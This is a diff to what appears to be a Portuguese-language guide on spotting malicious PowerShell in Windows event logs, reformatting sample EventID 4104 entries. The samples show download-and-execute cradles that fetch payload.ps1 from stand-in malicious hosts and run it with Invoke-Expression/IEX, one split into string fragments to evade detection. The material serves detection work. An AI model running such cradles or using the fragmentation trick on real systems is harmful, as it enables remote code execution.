@@ -143,7 +143,9 @@ Fragmentação de comando malicioso
 ```
 EventID: 4104 
 ScriptBlockText: 
-$a = 'Invoke-'; $b = 'WebRequest'; $c = '("http://malicious[.]site/payload.ps1")'; 
+$a = 'Invoke-';
+$b = 'WebRequest';
+$c = '("http://malicious[.]site/payload.ps1")'; 
 Invoke-Expression ($a + $b + $c)
 ```
 
@@ -158,7 +160,9 @@ Command: powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\update.ps
 ```
 ```
 [2026-04-08 08:14:23] EventID: 4104 
-ScriptBlockText: $client = New-Object System.Net.WebClient; $client.DownloadString("http://malicious-domain.com/payload.ps1") | IEX
+ScriptBlockText:
+$client = New-Object System.Net.WebClient;
+$client.DownloadString("http://malicious-domain.com/payload.ps1") | IEX
 ```
 ```
 [2026-04-08 08:14:24] EventID: 4688 
